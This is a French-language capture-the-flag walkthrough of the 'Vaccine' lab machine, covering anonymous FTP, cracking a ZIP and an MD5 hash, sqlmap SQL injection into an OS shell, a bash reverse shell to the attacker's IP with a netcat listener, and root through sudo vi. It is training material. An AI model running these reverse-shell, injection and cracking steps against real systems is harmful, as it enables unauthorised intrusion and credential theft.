# Vaccine Write-up

## Introduction

Le test de pénétration n'est pas simple, il nécessite beaucoup de connaissances techniques et la capacité de penser en dehors des sentiers battus. Parfois, vous trouverez des vulnérabilités simples mais dangereuses, d'autres fois vous trouverez des vulnérabilités pour lesquelles des exploits publics existent et que vous pouvez utiliser pour accéder facilement au système. La réalité est que la plupart du temps, vous devrez enchaîner de nombreuses vulnérabilités et mauvaises configurations différentes pour accéder au système de la machine cible, ou vous aurez un système qui n'a pas de vulnérabilités mais qui a un mot de passe faible qui pourrait vous donner accès au système. Vaccine est la machine qui nous apprend que l'énumération est toujours la clé, même si le système semble sécurisé. En plus de cela, elle nous apprend aussi l'importance du craquage de mots de passe. Il est surprenant de savoir que tout le monde n'a pas de mots de passe forts.

## Énumération

Comme d'habitude, nous commençons par un scan Nmap :

- **Commande** : `nmap -sC -sV {TARGET_IP}`

Il y a trois ports ouverts : 21 (FTP), 22 (SSH), 80 (HTTP). Comme nous n'avons pas d'identifiants pour le service SSH, nous allons commencer par l'énumération du port 21, car Nmap montre qu'il permet la connexion anonyme :

- **Commande** : `ftp {TARGET_IP}`
- **Commande** : `anonymous`
- **Commande** : `ls`

Nous voyons qu'il y a un fichier `backup.zip` disponible, nous allons le télécharger :

- **Commande** : `get backup.zip`

Le fichier sera situé dans le dossier à partir duquel nous avons établi la connexion FTP. Nous allons essayer de le décompresser avec la commande `unzip` :

- **Commande** : `unzip backup.zip`

L'archive compressée nous demande un mot de passe. Nous allons essayer quelques mots de passe basiques pour voir si cela fonctionne, mais sans succès.

Nous devrons d'une manière ou d'une autre craquer le mot de passe. L'outil que nous allons utiliser pour cette tâche s'appelle John the Ripper.

### John the Ripper

John the Ripper est un logiciel gratuit de craquage de mots de passe. Développé à l'origine pour le système d'exploitation Unix, il peut fonctionner sur quinze plates-formes différentes. Il est parmi les programmes de test et de craquage de mots de passe les plus fréquemment utilisés car il combine plusieurs craqueurs de mots de passe en un seul package, détecte automatiquement les types de hash de mots de passe et inclut un craqueur personnalisable.

Si vous ne l'avez pas installé, vous pouvez l'installer depuis le dépôt :

- **Commande** : `sudo apt install john`

Pour vérifier comment l'utiliser, vous pouvez taper la commande suivante :

- **Commande** : `john --help`

Pour réussir à craquer le mot de passe, nous devrons convertir le ZIP en hash en utilisant le module `zip2john` qui est inclus avec John the Ripper :

- **Commande** : `zip2john backup.zip > hashes`

Ensuite, nous allons taper la commande suivante pour charger la wordlist et faire une attaque par force brute contre le hash stocké dans le fichier `hashes` :

- **Commande** : `john --wordlist=/usr/share/wordlists/rockyou.txt hashes`

Une fois le mot de passe craqué, nous utiliserons l'option `--show` pour afficher le mot de passe craqué :

- **Commande** : `john --show hashes`

Nous voyons le mot de passe craqué : `741852963`. Nous allons maintenant extraire les fichiers :

- **Commande** : `unzip -P 741852963 backup.zip`

Nous allons maintenant lire le fichier `index.php` en premier :

- **Commande** : `cat index.php`

Nous voyons les identifiants `admin:2cb42f8734ea607eefed3b70af13bbd3`, que nous pourrions utiliser. Mais le mot de passe semble être haché.

Nous allons essayer d'identifier le type de hash et de le craquer avec hashcat :

- **Commande** : `hashcat -h`

### Hashcat

Hashcat est un outil avancé de craquage de mots de passe. Il permet de casser de nombreux types de hash de mots de passe différents, y compris MD5, SHA-1, SHA-256, et bien d'autres.

Nous allons commencer avec MD5. Nous mettons le hash dans un fichier texte appelé `hash` et nous le craquons avec hashcat :

- **Commande** : `echo "2cb42f8734ea607eefed3b70af13bbd3" > hash`
- **Commande** : `hashcat -m 0 -a 0 -o cracked.txt hash /usr/share/wordlists/rockyou.txt`

Hashcat a craqué le mot de passe : `qwerty789`.

Nous allons ouvrir notre navigateur web pour énumérer le port 80 et voir où nous pouvons nous connecter :

En utilisant le nom d'utilisateur précédemment trouvé et le mot de passe craqué, nous avons réussi à nous connecter !

## Obtention d'un accès initial

Le tableau de bord n'a rien de spécial, mais il a un catalogue, qui pourrait être connecté à la base de données. Créons une requête quelconque :

En vérifiant l'URL, nous voyons qu'il y a une variable `$search` qui est responsable de la recherche dans le catalogue. Nous pourrions tester si elle est injectable en SQL, mais au lieu de le faire manuellement, nous allons utiliser un outil appelé sqlmap.

### SQLmap

SQLmap est un outil open-source utilisé dans les tests de pénétration pour détecter et exploiter les failles d'injection SQL. SQLmap automatise le processus de détection et d'exploitation des injections SQL.

Il est pré-installé avec Parrot OS et Kali Linux, mais vous pouvez l'installer via le dépôt si vous ne l'avez pas :

- **Commande** : `sudo apt install sqlmap`

Pour voir comment l'utiliser, tapez la commande suivante :

- **Commande** : `sqlmap --help`

Nous allons fournir l'URL et le cookie à sqlmap pour qu'il trouve la vulnérabilité. La raison pour laquelle nous devons fournir un cookie est à cause de l'authentification :

Pour obtenir le cookie, nous pouvons intercepter une requête dans Burp Suite et l'obtenir de là, ou installer une extension géniale pour votre navigateur web appelée cookie-editor :

- **Pour Google Chrome** : [Cookie Editor](https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm)
- **Pour Firefox** : [Cookie Editor](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/)

Les cookies dans les messages HTTP des requêtes sont généralement définis de la manière suivante :
`PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1`

Sachant cela, voici à quoi devrait ressembler notre syntaxe sqlmap :

- **Commande** : `sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1"`

Nous avons exécuté sqlmap :

Note : Il y aura quelques questions que l'outil vous posera, vous pouvez répondre par 'Y' ou 'N', ou simplement en appuyant sur ENTRÉE pour la réponse par défaut.

La sortie importante pour nous est la suivante :

`GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N]`

L'outil a confirmé que la cible est vulnérable à l'injection SQL, ce qui est tout ce que nous avions besoin de savoir. Nous allons exécuter à nouveau sqlmap, où nous allons fournir le drapeau `--os-shell` pour pouvoir effectuer une injection de commande :

- **Commande** : `sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1" --os-shell`

Nous avons obtenu le shell, mais il n'est pas très stable et interactif. Pour le rendre plus stable, nous utiliserons la charge utile suivante :

- **Commande** : `bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"`

Nous allons démarrer l'écouteur Netcat sur le port 443 :

- **Commande** : `nc -lvnp 443`

Ensuite, nous exécuterons la charge utile :

Nous retournons à notre écouteur pour voir si nous avons la connexion :

Nous avons obtenu un point d'appui. Nous allons rapidement rendre notre shell pleinement interactif :

- **Commande** : `python3 -c 'import pty;pty.spawn("/bin/bash")'`
- **Commande** : `CTRL+Z`
- **Commande** : `stty raw -echo`
- **Commande** : `fg`
- **Commande** : `export TERM=xterm`

Nous avons maintenant un shell pleinement interactif.

Le flag utilisateur peut être trouvé dans /var/lib/postgresql/ :

- **Commande** : `ls /var/lib/postgresql/`
- **Commande** : `cat /var/lib/postgresql/user.txt`

## Escalade de privilèges

Nous sommes l'utilisateur `postgres`, mais nous ne connaissons pas le mot de passe, ce qui signifie que nous ne pouvons pas vérifier nos privilèges sudo :

Nous allons essayer de trouver le mot de passe dans le dossier `/var/www/html`, puisque la machine utilise à la fois PHP et SQL, ce qui signifie qu'il devrait y avoir des identifiants en clair :

- **Commande** : `cd /var/www/html`
- **Commande** : `ls -la`
- **Commande** : `cat dashboard.php`

Dans `dashboard.php`, nous avons trouvé les informations suivantes :

```php
session_start();
  if($_SESSION['login'] !== "true") {
    header("Location: index.php");
    die();
  }
  try {
    $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
  }
```

Le mot de passe est : `P@s5w0rd!`

Notez que le shell peut mourir soudainement, au lieu de refaire l'exploit, nous utiliserons SSH pour nous connecter :

- **Commande** : `ssh postgres@10.129.95.174`

Nous allons taper `sudo -l` pour voir quels privilèges nous avons :

Nous avons les privilèges sudo pour éditer le fichier `pg_hba.conf` en utilisant vi en exécutant `sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf`. Nous allons aller sur GTFOBins pour voir si nous pouvons abuser de ce privilège : [GTFOBins - vi](https://gtfobins.github.io/gtfobins/vi/#sudo)

Nous allons exécuter la commande :

- **Commande** : `sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf`

Nous ouvrons l'éditeur vi en tant que superutilisateur, qui a les privilèges root. Nous allons appuyer sur `:` pour définir les instructions dans Vi :

- **Commande** : `:set shell=/bin/sh`
- **Commande** : `:shell`

Ensuite, nous ouvrons à nouveau l'interface des instructions et tapons la commande suivante :

- **Commande** : `:shell`

Après avoir exécuté les instructions, nous verrons ce qui suit :

Le flag root peut être trouvé dans le dossier /root :

- **Commande** : `cd /root`
- **Commande** : `ls`
- **Commande** : `cat root.txt`

Nous avons réussi à obtenir le flag root, félicitations !
